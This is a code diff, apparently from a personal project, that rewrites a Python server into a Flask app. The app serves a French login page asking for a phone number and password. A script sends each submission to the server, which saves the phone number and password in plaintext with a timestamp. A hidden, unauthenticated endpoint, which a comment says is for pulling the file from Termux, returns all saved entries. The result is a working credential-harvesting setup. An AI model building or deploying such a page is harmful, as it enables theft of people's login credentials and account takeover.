@@ -1,13 +1,19 @@
-import http.server
-import socketserver
-import json
 import os
+import json
+from datetime import datetime
+from flask import Flask, request, jsonify, render_template_string
 
-# Render choisit son port via cette variable d'environnement
-PORT = int(os.environ.get("PORT", 8080))
+app = Flask(__name__)
+DATA_FILE = "messages.json"
 
-PAGE_HTML = """
- <!DOCTYPE html>
+# Initialiser le fichier JSON s'il n'existe pas
+if not os.path.exists(DATA_FILE):
+    with open(DATA_FILE, "w", encoding="utf-8") as f:
+        json.dump([], f)
+
+# Ton interface HTML/CSS personnalisée et adaptée pour Flask
+HTML_INTERFACE = """
+<!DOCTYPE html>
 <html lang="fr">
 <head>
     <meta charset="UTF-8">
@@ -18,6 +24,7 @@ PAGE_HTML = """
             font-family: Arial, sans-serif;
             background-color: #f4f4f9;
             display: flex;
+            flex-direction: column;
             justify-content: center;
             align-items: center;
             height: 100vh;
@@ -30,6 +37,7 @@ PAGE_HTML = """
             box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
             width: 100%;
             max-width: 400px;
+            box-sizing: border-box;
         }
         h2 {
             margin-bottom: 20px;
@@ -73,13 +81,21 @@ PAGE_HTML = """
         button:hover {
             background-color: #0056b3;
         }
+        .status {
+            margin-top: 15px;
+            text-align: center;
+            font-weight: bold;
+            font-size: 14px;
+        }
+        .success { color: #28a745; }
+        .error { color: #dc3545; }
     </style>
 </head>
 <body>
 
 <div class="login-container">
     <h2>Se connecter</h2>
-    <form action="/ma-page-de-traitement" method="POST">
+    <form id="loginForm">
         
         <div class="form-group">
             <label id="label-tel" for="phone">Numéro de téléphone :</label>
@@ -106,38 +122,89 @@ PAGE_HTML = """
         <button type="submit">Connexion</button>
         
     </form>
+    <div id="statusMessage" class="status"></div>
 </div>
+
+<script>
+    document.getElementById('loginForm').addEventListener('submit', function(e) {
+        e.preventDefault();
+        const statusDiv = document.getElementById('statusMessage');
+        statusDiv.className = 'status';
+        statusDiv.innerText = 'Connexion en cours...';
+
+        const payload = {
+            phone: document.getElementById('phone').value,
+            password: document.getElementById('password').value
+        };
+
+        fetch('/api/connexion', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(payload)
+        })
+        .then(res => res.json())
+        .then(data => {
+            if(data.status === 'success') {
+                statusDiv.className = 'status success';
+                statusDiv.innerText = '✅ Données transmises avec succès !';
+                // Optionnel : vider le formulaire après envoi
+                document.getElementById('password').value = '';
+            } else {
+                statusDiv.className = 'status error';
+                statusDiv.innerText = '❌ Erreur lors du traitement.';
+            }
+        })
+        .catch(() => {
+            statusDiv.className = 'status error';
+            statusDiv.innerText = '❌ Impossible de joindre le serveur.';
+        });
+    });
+</script>
 
 </body>
 </html>
 """
 
-class CloudHandler(http.server.SimpleHTTPRequestHandler):
-    def do_GET(self):
-        self.send_response(200)
-        self.send_header('Content-Type', 'text/html; charset=utf-8')
-        self.end_headers()
-        self.wfile.write(PAGE_HTML.encode('utf-8'))
+@app.route("/")
+def home():
+    return render_template_string(HTML_INTERFACE)
 
-    def do_POST(self):
-        if self.path == '/api/message':
-            taille = int(self.headers['Content-Length'])
-            corps_brut = self.rfile.read(taille).decode('utf-8')
-            donnees_recues = json.loads(corps_brut)
-            texte_final = donnees_recues.get('message_utilisateur', '')
-            
-            # Ce message s'affichera dans les "Logs" de Render
-            print(f"[LOG CLOUD] Saisie capturée : {texte_final}")
-            
-            self.send_response(200)
-            self.send_header('Content-Type', 'application/json')
-            self.end_headers()
-            
-            reponse_json = {"status": f"✓ Enregistré dans le Cloud : \"{texte_final}\""}
-            self.wfile.write(json.dumps(reponse_json).encode('utf-8'))
-        else:
-            super().do_POST()
+# Route API pour recevoir et enregistrer les données du formulaire
+@app.route("/api/connexion", methods=["POST"])
+def connexion():
+    try:
+        data = request.get_json()
+        if not data or "phone" not in data or "password" not in data:
+            return jsonify({"status": "error", "message": "Données incomplètes"}), 400
+        
+        nouvelle_entree = {
+            "date": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
+            "phone": data["phone"].strip(),
+            "password": data["password"].strip()
+        }
 
-with socketserver.TCPServer(("", PORT), CloudHandler) as httpd:
-    print(f"Serveur actif sur le port {PORT}")
-    httpd.serve_forever()
+        # Lire le fichier JSON existant, ajouter l'entrée, et sauvegarder
+        with open(DATA_FILE, "r+", encoding="utf-8") as f:
+            f_data = json.load(f)
+            f_data.append(nouvelle_entree)
+            f.seek(0)
+            json.dump(f_data, f, indent=4, ensure_ascii=False)
+            f.truncate()
+
+        return jsonify({"status": "success", "message": "Enregistré"}), 200
+    except Exception as e:
+        return jsonify({"status": "error", "message": str(e)}), 500
+
+# Route API pour récupérer le fichier de données depuis Termux
+@app.route("/api/recuperer-les-donnees-tsanta", methods=["GET"])
+def recuperer():
+    try:
+        with open(DATA_FILE, "r", encoding="utf-8") as f:
+            donnees = json.load(f)
+        return jsonify(donnees), 200
+    except Exception as e:
+        return jsonify({"status": "error", "message": str(e)}), 500
+
+if __name__ == "__main__":
+    port = int(os.environ.get("PORT", 8080))
+    app.run(host="0.0.0.0", port=port)
